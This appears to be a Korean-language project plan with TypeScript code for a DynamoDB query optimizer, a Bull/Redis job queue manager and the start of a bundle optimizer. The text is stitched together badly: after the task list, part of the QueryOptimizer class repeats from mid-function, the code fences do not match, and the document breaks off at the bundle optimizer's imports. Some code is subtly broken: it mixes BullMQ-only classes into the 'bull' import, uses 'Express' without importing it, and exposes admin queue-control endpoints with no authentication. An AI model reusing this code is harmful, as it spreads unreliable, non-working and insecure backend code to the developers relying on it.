### SubTask 0.11.2: 데이터베이스 쿼리 최적화
**목표**: DynamoDB 및 기타 데이터베이스 쿼리 최적화

**구현 내용**:
```typescript
// backend/src/performance/query-optimizer.ts
import { DynamoDBDocumentClient, QueryCommand, BatchGetCommand, BatchWriteCommand, UpdateCommand } from '@aws-sdk/lib-dynamodb';
import { logger } from '../config/logger';
import { MetricsHelper } from '../config/metrics';

// 쿼리 성능 모니터링
interface QueryMetrics {
  operation: string;
  table: string;
  duration: number;
  itemCount: number;
  consumedCapacity?: number;
  retryCount: number;
}

export class QueryOptimizer {
  private docClient: DynamoDBDocumentClient;
  private queryCache: Map<string, { data: any; timestamp: number }> = new Map();
  private readonly CACHE_TTL = 60000; // 1분
  
  constructor(docClient: DynamoDBDocumentClient) {
    this.docClient = docClient;
    
    // 정기적으로 캐시 정리
    setInterval(() => this.cleanupCache(), 300000); // 5분마다
  }
  
  // 배치 읽기 최적화
  async batchGet<T>(
    tableName: string,
    keys: Array<Record<string, any>>,
    projectionExpression?: string
  ): Promise<T[]> {
    const startTime = Date.now();
    const results: T[] = [];
    const uncachedKeys: Array<Record<string, any>> = [];
    
    // 캐시에서 먼저 확인
    for (const key of keys) {
      const cacheKey = this.generateCacheKey(tableName, key);
      const cached = this.getFromCache(cacheKey);
      
      if (cached) {
        results.push(cached);
      } else {
        uncachedKeys.push(key);
      }
    }
    
    // 캐시되지 않은 항목만 조회
    if (uncachedKeys.length > 0) {
      // DynamoDB는 최대 100개까지 배치 조회 가능
      const chunks = this.chunkArray(uncachedKeys, 100);
      
      for (const chunk of chunks) {
        const params: any = {
          RequestItems: {
            [tableName]: {
              Keys: chunk
            }
          }
        };
        
        if (projectionExpression) {
          params.RequestItems[tableName].ProjectionExpression = projectionExpression;
        }
        
        try {
          const response = await this.docClient.send(new BatchGetCommand(params));
          
          if (response.Responses?.[tableName]) {
            const items = response.Responses[tableName] as T[];
            results.push(...items);
            
            // 캐시에 저장
            items.forEach((item: any) => {
              const key = this.extractKey(tableName, item);
              const cacheKey = this.generateCacheKey(tableName, key);
              this.setCache(cacheKey, item);
            });
          }
          
          // 처리되지 않은 키가 있으면 재시도
          if (response.UnprocessedKeys?.[tableName]) {
            await this.handleUnprocessedKeys(
              tableName,
              response.UnprocessedKeys[tableName].Keys!,
              results
            );
          }
          
        } catch (error) {
          logger.error(`Batch get error for table ${tableName}:`, error);
          throw error;
        }
      }
    }
    
    // 메트릭 기록
    const duration = Date.now() - startTime;
    this.recordQueryMetrics({
      operation: 'batchGet',
      table: tableName,
      duration,
      itemCount: results.length,
      retryCount: 0
    });
    
    return results;
  }
  
  // 배치 쓰기 최적화
  async batchWrite(
    tableName: string,
    items: Array<{ PutRequest?: { Item: any }; DeleteRequest?: { Key: any } }>
  ): Promise<void> {
    const startTime = Date.now();
    let processedCount = 0;
    let retryCount = 0;
    
    // DynamoDB는 최대 25개까지 배치 쓰기 가능
    const chunks = this.chunkArray(items, 25);
    
    for (const chunk of chunks) {
      const params = {
        RequestItems: {
          [tableName]: chunk
        }
      };
      
      let unprocessedItems = chunk;
      const maxRetries = 3;
      
      while (unprocessedItems.length > 0 && retryCount < maxRetries) {
        try {
          const response = await this.docClient.send(new BatchWriteCommand({
            RequestItems: {
              [tableName]: unprocessedItems
            }
          }));
          
          processedCount += unprocessedItems.length;
          
          if (response.UnprocessedItems?.[tableName]) {
            unprocessedItems = response.UnprocessedItems[tableName];
            retryCount++;
            
            // 지수 백오프
            await this.exponentialBackoff(retryCount);
          } else {
            unprocessedItems = [];
          }
          
          // 캐시 무효화
          chunk.forEach(item => {
            if (item.PutRequest) {
              const key = this.extractKey(tableName, item.PutRequest.Item);
              const cacheKey = this.generateCacheKey(tableName, key);
              this.invalidateCache(cacheKey);
            } else if (item.DeleteRequest) {
              const cacheKey = this.generateCacheKey(tableName, item.DeleteRequest.Key);
              this.invalidateCache(cacheKey);
            }
          });
          
        } catch (error) {
          logger.error(`Batch write error for table ${tableName}:`, error);
          throw error;
        }
      }
      
      if (unprocessedItems.length > 0) {
        logger.warn(`${unprocessedItems.length} items were not processed after ${maxRetries} retries`);
      }
    }
    
    // 메트릭 기록
    const duration = Date.now() - startTime;
    this.recordQueryMetrics({
      operation: 'batchWrite',
      table: tableName,
      duration,
      itemCount: processedCount,
      retryCount
    });
  }
  
  // 페이지네이션 최적화
  async *paginatedQuery<T>(
    tableName: string,
    keyConditionExpression: string,
    expressionAttributeValues: Record<string, any>,
    options: {
      indexName?: string;
      projectionExpression?: string;
      filterExpression?: string;
      limit?: number;
      scanIndexForward?: boolean;
    } = {}
  ): AsyncGenerator<T[], void, unknown> {
    let lastEvaluatedKey: Record<string, any> | undefined;
    let totalItems = 0;
    const startTime = Date.now();
    
    do {
      const params: any = {
        TableName: tableName,
        KeyConditionExpression: keyConditionExpression,
        ExpressionAttributeValues: expressionAttributeValues,
        Limit: options.limit || 100,
        ExclusiveStartKey: lastEvaluatedKey
      };
      
      // 옵션 추가
      if (options.indexName) params.IndexName = options.indexName;
      if (options.projectionExpression) params.ProjectionExpression = options.projectionExpression;
      if (options.filterExpression) params.FilterExpression = options.filterExpression;
      if (options.scanIndexForward !== undefined) params.ScanIndexForward = options.scanIndexForward;
      
      try {
        const response = await this.docClient.send(new QueryCommand(params));
        
        if (response.Items && response.Items.length > 0) {
          totalItems += response.Items.length;
          yield response.Items as T[];
        }
        
        lastEvaluatedKey = response.LastEvaluatedKey;
        
        // 소비된 용량 기록
        if (response.ConsumedCapacity) {
          this.recordConsumedCapacity(tableName, response.ConsumedCapacity);
        }
        
      } catch (error) {
        logger.error(`Query error for table ${tableName}:`, error);
        throw error;
      }
      
    } while (lastEvaluatedKey);
    
    // 전체 쿼리 메트릭 기록
    const duration = Date.now() - startTime;
    this.recordQueryMetrics({
      operation: 'paginatedQuery',
      table: tableName,
      duration,
      itemCount: totalItems,
      retryCount: 0
    });
  }
  
  // 병렬 쿼리 실행
  async parallelQueries<T>(
    queries: Array<{
      table: string;
      keyCondition: string;
      values: Record<string, any>;
      options?: any;
    }>
  ): Promise<T[][]> {
    const startTime = Date.now();
    
    const promises = queries.map(async (query) => {
      const items: T[] = [];
      
      for await (const batch of this.paginatedQuery<T>(
        query.table,
        query.keyCondition,
        query.values,
        query.options
      )) {
        items.push(...batch);
      }
      
      return items;
    });
    
    const results = await Promise.all(promises);
    
    // 메트릭 기록
    const duration = Date.now() - startTime;
    const totalItems = results.reduce((sum, items) => sum + items.length, 0);
    
    this.recordQueryMetrics({
      operation: 'parallelQueries',
      table: 'multiple',
      duration,
      itemCount: totalItems,
      retryCount: 0
    });
    
    return results;
  }
  
  // 인덱스 프로젝션 최적화
  optimizeProjection(
    requiredAttributes: string[],
    indexProjections: Record<string, string[]>
  ): { indexName?: string; projectionExpression?: string } {
    // 필요한 속성을 모두 포함하는 가장 작은 인덱스 찾기
    let bestIndex: string | undefined;
    let minExtraAttributes = Infinity;
    
    for (const [indexName, projectedAttributes] of Object.entries(indexProjections)) {
      const missingAttributes = requiredAttributes.filter(
        attr => !projectedAttributes.includes(attr)
      );
      
      if (missingAttributes.length === 0) {
        // 모든 속성을 포함하는 인덱스 발견
        const extraAttributes = projectedAttributes.length - requiredAttributes.length;
        if (extraAttributes < minExtraAttributes) {
          bestIndex = indexName;
          minExtraAttributes = extraAttributes;
        }
      }
    }
    
    return {
      indexName: bestIndex,
      projectionExpression: requiredAttributes.join(', ')
    };
  }
  
  // 조건부 쓰기 최적화
  async conditionalWrite(
    tableName: string,
    key: Record<string, any>,
    updateExpression: string,
    conditionExpression: string,
    expressionAttributeValues: Record<string, any>,
    retryOptions = { maxRetries: 3, baseDelay: 100 }
  ): Promise<void> {
    let retryCount = 0;
    
    while (retryCount <= retryOptions.maxRetries) {
      try {
        await this.docClient.send(new UpdateCommand({
          TableName: tableName,
          Key: key,
          UpdateExpression: updateExpression,
          ConditionExpression: conditionExpression,
          ExpressionAttributeValues: expressionAttributeValues,
          ReturnConsumedCapacity: 'TOTAL'
        }));
        
        // 성공하면 캐시 무효화
        const cacheKey = this.generateCacheKey(tableName, key);
        this.invalidateCache(cacheKey);
        
        return;
        
      } catch (error: any) {
        if (error.name === 'ConditionalCheckFailedException') {
          if (retryCount < retryOptions.maxRetries) {
            // 조건 확인 실패 시 재시도
            await this.exponentialBackoff(retryCount, retryOptions.baseDelay);
            retryCount++;
          } else {
            throw error;
          }
        } else {
          throw error;
        }
      }
    }
  }
  
  // 헬퍼 메서드들
  private chunkArray<T>(array: T[], size: number): T[][] {
    const chunks: T[][] = [];
    for (let i = 0; i < array.length; i += size) {
      chunks.push(array.slice(i, i + size));
    }
    return chunks;
  }
  
  private async exponentialBackoff(retryCount: number, baseDelay: number = 100): Promise<void> {
    const delay = baseDelay * Math.pow(2, retryCount) + Math.random() * 100;
    await new Promise(resolve => setTimeout(resolve, delay));
  }
  
  private generateCacheKey(tableName: string, key: Record<string, any>): string {
    return `${tableName}:${JSON.stringify(key)}`;
  }
  
  private getFromCache(key: string): any {
    const cached = this.queryCache.get(key);
    if (cached && Date.now() - cached.timestamp < this.CACHE_TTL) {
      return cached.data;
    }
    return null;
  }
  
  private setCache(key: string, data: any): void {
    this.queryCache.set(key, {
      data,
      timestamp: Date.now()
    });
  }
  
  private invalidateCache(key: string): void {
    this.queryCache.delete(key);
  }
  
  private cleanupCache(): void {
    const now = Date.now();
    for (const [key, value] of this.queryCache.entries()) {
      if (now - value.timestamp > this.CACHE_TTL) {
        this.queryCache.delete(key);
      }
    }
  }
  
  private extractKey(tableName: string, item: any): Record<string, any> {
    // 테이블별 키 추출 로직
    return { id: item.id };
  }
  
  private async handleUnprocessedKeys<T>(
    tableName: string,
    unprocessedKeys: Array<Record<string, any>>,
    results: T[]
  ): Promise<void> {
    const retryResults = await this.batchGet<T>(tableName, unprocessedKeys);
    results.push(...retryResults);
  }
  
  private recordQueryMetrics(metrics: QueryMetrics): void {
    MetricsHelper.recordDatabaseOperation(
      metrics.operation,
      metrics.table,
      metrics.duration,
      metrics.itemCount
    );
    
    logger.debug('Query metrics:', metrics);
  }
  
  private recordConsumedCapacity(tableName: string, capacity: any): void {
    if (capacity.CapacityUnits) {
      MetricsHelper.recordConsumedCapacity(
        tableName,
        capacity.CapacityUnits
      );
    }
  }
}

// 쿼리 빌더 헬퍼
export class DynamoQueryBuilder {
  private keyConditions: string[] = [];
  private filterConditions: string[] = [];
  private attributeValues: Record<string, any> = {};
  private attributeNames: Record<string, string> = {};
  private projectionAttributes: string[] = [];
  
  key(attribute: string, operator: '=' | '<' | '<=' | '>' | '>=' | 'BETWEEN' | 'begins_with', value: any): this {
    const placeholder = `:${attribute}`;
    
    switch (operator) {
      case '=':
        this.keyConditions.push(`${attribute} = ${placeholder}`);
        this.attributeValues[placeholder] = value;
        break;
      case 'BETWEEN':
        this.keyConditions.push(`${attribute} BETWEEN ${placeholder}1 AND ${placeholder}2`);
        this.attributeValues[`${placeholder}1`] = value[0];
        this.attributeValues[`${placeholder}2`] = value[1];
        break;
      case 'begins_with':
        this.keyConditions.push(`begins_with(${attribute}, ${placeholder})`);
        this.attributeValues[placeholder] = value;
        break;
      default:
        this.keyConditions.push(`${attribute} ${operator} ${placeholder}`);
        this.attributeValues[placeholder] = value;
    }
    
    return this;
  }
  
  filter(attribute: string, operator: string, value: any): this {
    const placeholder = `:filter${Object.keys(this.attributeValues).length}`;
    this.filterConditions.push(`${attribute} ${operator} ${placeholder}`);
    this.attributeValues[placeholder] = value;
    return this;
  }
  
  project(...attributes: string[]): this {
    this.projectionAttributes.push(...attributes);
    return this;
  }
  
  build(): {
    KeyConditionExpression: string;
    FilterExpression?: string;
    ProjectionExpression?: string;
    ExpressionAttributeValues: Record<string, any>;
    ExpressionAttributeNames?: Record<string, string>;
  } {
    const result: any = {
      KeyConditionExpression: this.keyConditions.join(' AND '),
      ExpressionAttributeValues: this.attributeValues
    };
    
    if (this.filterConditions.length > 0) {
      result.FilterExpression = this.filterConditions.join(' AND ');
    }
    
    if (this.projectionAttributes.length > 0) {
      result.ProjectionExpression = this.projectionAttributes.join(', ');
    }
    
    if (Object.keys(this.attributeNames).length > 0) {
      result.ExpressionAttributeNames = this.attributeNames;
    }
    
    return result;
  }
}

**🔧 사용자 작업**:
- QueryOptimizer를 DynamoDB 클라이언트에 통합
- 캐시 TTL 및 크기 제한 설정
- 테이블별 키 추출 로직 구현
- 성능 메트릭 모니터링 설정

---
        const extraAttributes = projectedAttributes.length - requiredAttributes.length;
        if (extraAttributes < minExtraAttributes) {
          bestIndex = indexName;
          minExtraAttributes = extraAttributes;
        }
      }
    }
    
    return {
      indexName: bestIndex,
      projectionExpression: requiredAttributes.join(', ')
    };
  }
  
  // 조건부 쓰기 최적화
  async conditionalWrite(
    tableName: string,
    key: Record<string, any>,
    updateExpression: string,
    conditionExpression: string,
    expressionAttributeValues: Record<string, any>,
    retryOptions = { maxRetries: 3, baseDelay: 100 }
  ): Promise<void> {
    let retryCount = 0;
    
    while (retryCount <= retryOptions.maxRetries) {
      try {
        await this.docClient.send(new UpdateCommand({
          TableName: tableName,
          Key: key,
          UpdateExpression: updateExpression,
          ConditionExpression: conditionExpression,
          ExpressionAttributeValues: expressionAttributeValues,
          ReturnConsumedCapacity: 'TOTAL'
        }));
        
        // 성공하면 캐시 무효화
        const cacheKey = this.generateCacheKey(tableName, key);
        this.invalidateCache(cacheKey);
        
        return;
        
      } catch (error: any) {
        if (error.name === 'ConditionalCheckFailedException') {
          if (retryCount < retryOptions.maxRetries) {
            // 조건 확인 실패 시 재시도
            await this.exponentialBackoff(retryCount, retryOptions.baseDelay);
            retryCount++;
          } else {
            throw error;
          }
        } else {
          throw error;
        }
      }
    }
  }
  
  // 헬퍼 메서드들
  private chunkArray<T>(array: T[], size: number): T[][] {
    const chunks: T[][] = [];
    for (let i = 0; i < array.length; i += size) {
      chunks.push(array.slice(i, i + size));
    }
    return chunks;
  }
  
  private async exponentialBackoff(retryCount: number, baseDelay: number = 100): Promise<void> {
    const delay = baseDelay * Math.pow(2, retryCount) + Math.random() * 100;
    await new Promise(resolve => setTimeout(resolve, delay));
  }
  
  private generateCacheKey(tableName: string, key: Record<string, any>): string {
    return `${tableName}:${JSON.stringify(key)}`;
  }
  
  private getFromCache(key: string): any {
    const cached = this.queryCache.get(key);
    if (cached && Date.now() - cached.timestamp < this.CACHE_TTL) {
      return cached.data;
    }
    return null;
  }
  
  private setCache(key: string, data: any): void {
    this.queryCache.set(key, {
      data,
      timestamp: Date.now()
    });
  }
  
  private invalidateCache(key: string): void {
    this.queryCache.delete(key);
  }
  
  private cleanupCache(): void {
    const now = Date.now();
    for (const [key, value] of this.queryCache.entries()) {
      if (now - value.timestamp > this.CACHE_TTL) {
        this.queryCache.delete(key);
      }
    }
  }
  
  private extractKey(tableName: string, item: any): Record<string, any> {
    // 테이블별 키 추출 로직
    // 실제 구현에서는 테이블 스키마에 따라 다름
    return { id: item.id };
  }
  
  private async handleUnprocessedKeys<T>(
    tableName: string,
    unprocessedKeys: Array<Record<string, any>>,
    results: T[]
  ): Promise<void> {
    // 재시도 로직
    await this.batchGet(tableName, unprocessedKeys);
  }
  
  private recordQueryMetrics(metrics: QueryMetrics): void {
    // 메트릭 기록
    MetricsHelper.recordDatabaseOperation(
      metrics.operation,
      metrics.table,
      metrics.duration,
      metrics.itemCount
    );
    
    logger.debug('Query metrics:', metrics);
  }
  
  private recordConsumedCapacity(tableName: string, capacity: any): void {
    if (capacity.CapacityUnits) {
      MetricsHelper.recordConsumedCapacity(
        tableName,
        capacity.CapacityUnits
      );
    }
  }
}

// 쿼리 빌더 헬퍼
export class DynamoQueryBuilder {
  private keyConditions: string[] = [];
  private filterConditions: string[] = [];
  private attributeValues: Record<string, any> = {};
  private attributeNames: Record<string, string> = {};
  private projectionAttributes: string[] = [];
  
  key(attribute: string, operator: '=' | '<' | '<=' | '>' | '>=' | 'BETWEEN' | 'begins_with', value: any): this {
    const placeholder = `:${attribute}`;
    
    switch (operator) {
      case '=':
        this.keyConditions.push(`${attribute} = ${placeholder}`);
        this.attributeValues[placeholder] = value;
        break;
      case 'BETWEEN':
        this.keyConditions.push(`${attribute} BETWEEN ${placeholder}1 AND ${placeholder}2`);
        this.attributeValues[`${placeholder}1`] = value[0];
        this.attributeValues[`${placeholder}2`] = value[1];
        break;
      case 'begins_with':
        this.keyConditions.push(`begins_with(${attribute}, ${placeholder})`);
        this.attributeValues[placeholder] = value;
        break;
      default:
        this.keyConditions.push(`${attribute} ${operator} ${placeholder}`);
        this.attributeValues[placeholder] = value;
    }
    
    return this;
  }
  
  filter(attribute: string, operator: string, value: any): this {
    const placeholder = `:filter${Object.keys(this.attributeValues).length}`;
    this.filterConditions.push(`${attribute} ${operator} ${placeholder}`);
    this.attributeValues[placeholder] = value;
    return this;
  }
  
  project(...attributes: string[]): this {
    this.projectionAttributes.push(...attributes);
    return this;
  }
  
  build(): {
    KeyConditionExpression: string;
    FilterExpression?: string;
    ProjectionExpression?: string;
    ExpressionAttributeValues: Record<string, any>;
    ExpressionAttributeNames?: Record<string, string>;
  } {
    const result: any = {
      KeyConditionExpression: this.keyConditions.join(' AND '),
      ExpressionAttributeValues: this.attributeValues
    };
    
    if (this.filterConditions.length > 0) {
      result.FilterExpression = this.filterConditions.join(' AND ');
    }
    
    if (this.projectionAttributes.length > 0) {
      result.ProjectionExpression = this.projectionAttributes.join(', ');
    }
    
    if (Object.keys(this.attributeNames).length > 0) {
      result.ExpressionAttributeNames = this.attributeNames;
    }
    
    return result;
  }
}
```

### SubTask 0.11.3: 비동기 작업 큐 시스템
**목표**: 백그라운드 작업 처리를 위한 큐 시스템 구축

**구현 내용**:
```typescript
// backend/src/performance/job-queue.ts
import Bull, { Queue, Job, JobOptions, WorkerOptions, QueueScheduler } from 'bull';
import { logger } from '../config/logger';
import { MetricsHelper } from '../config/metrics';
import Redis from 'ioredis';

// 작업 타입 정의
export enum JobType {
  AGENT_EXECUTION = 'agent_execution',
  PROJECT_BUILD = 'project_build',
  COMPONENT_GENERATION = 'component_generation',
  EMAIL_NOTIFICATION = 'email_notification',
  REPORT_GENERATION = 'report_generation',
  CACHE_WARMING = 'cache_warming',
  DATA_EXPORT = 'data_export',
  CLEANUP = 'cleanup'
}

// 작업 우선순위
export enum JobPriority {
  CRITICAL = 1,
  HIGH = 2,
  NORMAL = 3,
  LOW = 4
}

// 작업 데이터 인터페이스
interface BaseJobData {
  type: JobType;
  userId?: string;
  projectId?: string;
  timestamp: number;
}

interface AgentExecutionJob extends BaseJobData {
  type: JobType.AGENT_EXECUTION;
  agentName: string;
  input: any;
}

interface ProjectBuildJob extends BaseJobData {
  type: JobType.PROJECT_BUILD;
  projectConfig: any;
}

export type JobData = AgentExecutionJob | ProjectBuildJob;

// 큐 매니저
export class QueueManager {
  private queues: Map<string, Queue> = new Map();
  private schedulers: Map<string, QueueScheduler> = new Map();
  private redisConnection: Redis;
  
  constructor() {
    this.redisConnection = new Redis({
      host: process.env.REDIS_HOST || 'localhost',
      port: parseInt(process.env.REDIS_PORT || '6379'),
      password: process.env.REDIS_PASSWORD,
      maxRetriesPerRequest: null
    });
  }
  
  // 큐 초기화
  async initialize(): Promise<void> {
    // 메인 작업 큐
    await this.createQueue('main', {
      defaultJobOptions: {
        removeOnComplete: 100,
        removeOnFail: 1000,
        attempts: 3,
        backoff: {
          type: 'exponential',
          delay: 2000
        }
      }
    });
    
    // 우선순위 큐
    await this.createQueue('priority', {
      defaultJobOptions: {
        removeOnComplete: 50,
        removeOnFail: 500,
        attempts: 5
      }
    });
    
    // 배치 작업 큐
    await this.createQueue('batch', {
      defaultJobOptions: {
        removeOnComplete: true,
        removeOnFail: false,
        attempts: 1
      }
    });
    
    // 스케줄 작업 큐
    await this.createQueue('scheduled', {
      defaultJobOptions: {
        removeOnComplete: true,
        attempts: 3
      }
    });
    
    logger.info('Job queues initialized');
  }
  
  // 큐 생성
  private async createQueue(name: string, options?: any): Promise<Queue> {
    const queue = new Bull(name, {
      redis: {
        host: process.env.REDIS_HOST || 'localhost',
        port: parseInt(process.env.REDIS_PORT || '6379'),
        password: process.env.REDIS_PASSWORD
      },
      ...options
    });
    
    // 큐 스케줄러 생성 (지연 작업 지원)
    const scheduler = new QueueScheduler(name, {
      connection: this.redisConnection
    });
    
    this.queues.set(name, queue);
    this.schedulers.set(name, scheduler);
    
    // 큐 이벤트 리스너
    this.setupQueueEventListeners(queue, name);
    
    return queue;
  }
  
  // 작업 추가
  async addJob(
    queueName: string,
    jobName: string,
    data: JobData,
    options?: JobOptions
  ): Promise<Job> {
    const queue = this.queues.get(queueName);
    if (!queue) {
      throw new Error(`Queue ${queueName} not found`);
    }
    
    const jobOptions: JobOptions = {
      ...options,
      priority: this.getJobPriority(data.type)
    };
    
    const job = await queue.add(jobName, data, jobOptions);
    
    logger.info(`Job added to queue ${queueName}:`, {
      jobId: job.id,
      jobName,
      type: data.type
    });
    
    // 메트릭 기록
    MetricsHelper.recordJobQueued(queueName, jobName);
    
    return job;
  }
  
  // 배치 작업 추가
  async addBulkJobs(
    queueName: string,
    jobs: Array<{ name: string; data: JobData; opts?: JobOptions }>
  ): Promise<Job[]> {
    const queue = this.queues.get(queueName);
    if (!queue) {
      throw new Error(`Queue ${queueName} not found`);
    }
    
    const bulkJobs = jobs.map(job => ({
      name: job.name,
      data: job.data,
      opts: {
        ...job.opts,
        priority: this.getJobPriority(job.data.type)
      }
    }));
    
    const addedJobs = await queue.addBulk(bulkJobs);
    
    logger.info(`${jobs.length} jobs added to queue ${queueName}`);
    
    // 메트릭 기록
    MetricsHelper.recordBulkJobsQueued(queueName, jobs.length);
    
    return addedJobs;
  }
  
  // 스케줄 작업 추가
  async scheduleJob(
    queueName: string,
    jobName: string,
    data: JobData,
    cronExpression: string,
    options?: JobOptions
  ): Promise<void> {
    const queue = this.queues.get(queueName);
    if (!queue) {
      throw new Error(`Queue ${queueName} not found`);
    }
    
    await queue.add(jobName, data, {
      ...options,
      repeat: {
        cron: cronExpression,
        tz: 'UTC'
      }
    });
    
    logger.info(`Scheduled job added to queue ${queueName}:`, {
      jobName,
      cron: cronExpression
    });
  }
  
  // 지연 작업 추가
  async addDelayedJob(
    queueName: string,
    jobName: string,
    data: JobData,
    delayMs: number,
    options?: JobOptions
  ): Promise<Job> {
    return this.addJob(queueName, jobName, data, {
      ...options,
      delay: delayMs
    });
  }
  
  // 작업 상태 조회
  async getJobStatus(queueName: string, jobId: string): Promise<any> {
    const queue = this.queues.get(queueName);
    if (!queue) {
      throw new Error(`Queue ${queueName} not found`);
    }
    
    const job = await queue.getJob(jobId);
    if (!job) {
      return null;
    }
    
    const state = await job.getState();
    const progress = job.progress();
    
    return {
      id: job.id,
      name: job.name,
      data: job.data,
      state,
      progress,
      attemptsMade: job.attemptsMade,
      processedOn: job.processedOn,
      finishedOn: job.finishedOn,
      failedReason: job.failedReason
    };
  }
  
  // 큐 상태 조회
  async getQueueStats(queueName: string): Promise<any> {
    const queue = this.queues.get(queueName);
    if (!queue) {
      throw new Error(`Queue ${queueName} not found`);
    }
    
    const [
      waitingCount,
      activeCount,
      completedCount,
      failedCount,
      delayedCount,
      pausedCount
    ] = await Promise.all([
      queue.getWaitingCount(),
      queue.getActiveCount(),
      queue.getCompletedCount(),
      queue.getFailedCount(),
      queue.getDelayedCount(),
      queue.isPaused()
    ]);
    
    return {
      name: queueName,
      counts: {
        waiting: waitingCount,
        active: activeCount,
        completed: completedCount,
        failed: failedCount,
        delayed: delayedCount
      },
      isPaused: pausedCount
    };
  }
  
  // 큐 일시정지/재개
  async pauseQueue(queueName: string): Promise<void> {
    const queue = this.queues.get(queueName);
    if (!queue) {
      throw new Error(`Queue ${queueName} not found`);
    }
    
    await queue.pause();
    logger.info(`Queue ${queueName} paused`);
  }
  
  async resumeQueue(queueName: string): Promise<void> {
    const queue = this.queues.get(queueName);
    if (!queue) {
      throw new Error(`Queue ${queueName} not found`);
    }
    
    await queue.resume();
    logger.info(`Queue ${queueName} resumed`);
  }
  
  // 큐 정리
  async cleanQueue(queueName: string, grace: number = 5000): Promise<void> {
    const queue = this.queues.get(queueName);
    if (!queue) {
      throw new Error(`Queue ${queueName} not found`);
    }
    
    await queue.clean(grace, 'completed');
    await queue.clean(grace, 'failed');
    
    logger.info(`Queue ${queueName} cleaned`);
  }
  
  // 실패한 작업 재시도
  async retryFailedJobs(queueName: string): Promise<number> {
    const queue = this.queues.get(queueName);
    if (!queue) {
      throw new Error(`Queue ${queueName} not found`);
    }
    
    const failedJobs = await queue.getFailed();
    let retryCount = 0;
    
    for (const job of failedJobs) {
      if (job.attemptsMade < (job.opts.attempts || 3)) {
        await job.retry();
        retryCount++;
      }
    }
    
    logger.info(`Retried ${retryCount} failed jobs in queue ${queueName}`);
    
    return retryCount;
  }
  
  // 큐 이벤트 리스너 설정
  private setupQueueEventListeners(queue: Queue, name: string): void {
    queue.on('completed', (job, result) => {
      logger.debug(`Job completed in queue ${name}:`, {
        jobId: job.id,
        duration: Date.now() - job.timestamp
      });
      
      MetricsHelper.recordJobCompleted(name, job.name, Date.now() - job.timestamp);
    });
    
    queue.on('failed', (job, err) => {
      logger.error(`Job failed in queue ${name}:`, {
        jobId: job.id,
        error: err.message,
        attempts: job.attemptsMade
      });
      
      MetricsHelper.recordJobFailed(name, job.name);
    });
    
    queue.on('stalled', (job) => {
      logger.warn(`Job stalled in queue ${name}:`, {
        jobId: job.id
      });
    });
    
    queue.on('progress', (job, progress) => {
      logger.debug(`Job progress in queue ${name}:`, {
        jobId: job.id,
        progress
      });
    });
  }
  
  // 작업 우선순위 결정
  private getJobPriority(jobType: JobType): number {
    const priorityMap: Record<JobType, JobPriority> = {
      [JobType.AGENT_EXECUTION]: JobPriority.HIGH,
      [JobType.PROJECT_BUILD]: JobPriority.HIGH,
      [JobType.COMPONENT_GENERATION]: JobPriority.NORMAL,
      [JobType.EMAIL_NOTIFICATION]: JobPriority.NORMAL,
      [JobType.REPORT_GENERATION]: JobPriority.LOW,
      [JobType.CACHE_WARMING]: JobPriority.LOW,
      [JobType.DATA_EXPORT]: JobPriority.NORMAL,
      [JobType.CLEANUP]: JobPriority.LOW
    };
    
    return priorityMap[jobType] || JobPriority.NORMAL;
  }
  
  // 종료 처리
  async shutdown(): Promise<void> {
    logger.info('Shutting down job queues...');
    
    // 모든 큐 종료
    for (const [name, queue] of this.queues) {
      await queue.close();
      logger.info(`Queue ${name} closed`);
    }
    
    // 스케줄러 종료
    for (const [name, scheduler] of this.schedulers) {
      await scheduler.close();
      logger.info(`Scheduler ${name} closed`);
    }
    
    // Redis 연결 종료
    await this.redisConnection.quit();
    
    logger.info('Job queues shutdown complete');
  }
}

// Job Worker 베이스 클래스
export abstract class JobWorker {
  protected queue: Queue;
  protected concurrency: number;
  
  constructor(queue: Queue, concurrency: number = 1) {
    this.queue = queue;
    this.concurrency = concurrency;
  }
  
  // 워커 시작
  async start(): Promise<void> {
    this.queue.process(this.concurrency, async (job: Job) => {
      const startTime = Date.now();
      
      try {
        logger.info(`Processing job ${job.id} of type ${job.name}`);
        
        // 진행률 업데이트
        await job.progress(0);
        
        // 실제 작업 처리
        const result = await this.process(job);
        
        // 완료 진행률
        await job.progress(100);
        
        const duration = Date.now() - startTime;
        logger.info(`Job ${job.id} completed in ${duration}ms`);
        
        return result;
        
      } catch (error) {
        logger.error(`Job ${job.id} failed:`, error);
        throw error;
      }
    });
  }
  
  // 추상 메서드: 실제 작업 처리
  abstract process(job: Job): Promise<any>;
}

// 에이전트 실행 워커 예시
export class AgentExecutionWorker extends JobWorker {
  async process(job: Job<AgentExecutionJob>): Promise<any> {
    const { agentName, input } = job.data;
    
    // 진행률 업데이트
    await job.progress(10);
    
    // 에이전트 초기화
    const agent = await this.initializeAgent(agentName);
    await job.progress(30);
    
    // 에이전트 실행
    const result = await agent.execute(input);
    await job.progress(90);
    
    // 결과 저장
    await this.saveResult(job.data.projectId!, result);
    
    return result;
  }
  
  private async initializeAgent(agentName: string): Promise<any> {
    // 에이전트 초기화 로직
    return {};
  }
  
  private async saveResult(projectId: string, result: any): Promise<void> {
    // 결과 저장 로직
  }
}

// 큐 관리 API 엔드포인트
export function setupQueueManagementEndpoints(app: Express, queueManager: QueueManager): void {
  // 큐 상태 조회
  app.get('/api/admin/queues/:name/stats', async (req, res) => {
    try {
      const stats = await queueManager.getQueueStats(req.params.name);
      res.json(stats);
    } catch (error) {
      res.status(400).json({ error: error.message });
    }
  });
  
  // 작업 상태 조회
  app.get('/api/admin/queues/:name/jobs/:id', async (req, res) => {
    try {
      const status = await queueManager.getJobStatus(req.params.name, req.params.id);
      res.json(status);
    } catch (error) {
      res.status(400).json({ error: error.message });
    }
  });
  
  // 큐 일시정지
  app.post('/api/admin/queues/:name/pause', async (req, res) => {
    try {
      await queueManager.pauseQueue(req.params.name);
      res.json({ success: true });
    } catch (error) {
      res.status(400).json({ error: error.message });
    }
  });
  
  // 큐 재개
  app.post('/api/admin/queues/:name/resume', async (req, res) => {
    try {
      await queueManager.resumeQueue(req.params.name);
      res.json({ success: true });
    } catch (error) {
      res.status(400).json({ error: error.message });
    }
  });
  
  // 실패한 작업 재시도
  app.post('/api/admin/queues/:name/retry-failed', async (req, res) => {
    try {
      const count = await queueManager.retryFailedJobs(req.params.name);
      res.json({ retriedJobs: count });
    } catch (error) {
      res.status(400).json({ error: error.message });
    }
  });
}
```
---

### SubTask 0.11.4: 코드 스플리팅 및 번들 최적화
**목표**: 프론트엔드 및 백엔드 코드 번들 최적화

**구현 내용**:
```typescript
// backend/src/performance/bundle-optimizer.ts
import webpack from 'webpack';
import TerserPlugin from 'terser-webpack-plugin';
